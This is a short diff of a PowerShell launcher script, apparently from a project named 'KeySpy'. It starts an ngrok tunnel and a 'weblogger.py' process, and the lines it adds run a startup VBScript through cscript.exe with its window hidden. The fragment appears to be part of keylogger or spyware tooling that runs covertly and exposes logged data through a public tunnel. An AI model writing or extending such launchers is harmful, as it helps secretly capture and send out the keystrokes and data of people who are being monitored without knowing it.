@@ -17,3 +17,7 @@ Start-Job -ScriptBlock { Invoke-Expression -Command $using:ngrokCommand}
 # Start weblogger.py
 Write-Output "Starting weblogger.py..."
 Invoke-Expression -Command $webloggerCommand 
+
+# Execute the execute.vbs script using cscript.exe
+$vbsStartUpFilePath = "C:\Users\samra\Desktop\KeySpy\startup.vbs"
+Start-Process cscript.exe -ArgumentList "//B //Nologo $vbsStartUpFilePath" -WindowStyle Hidden -Wait
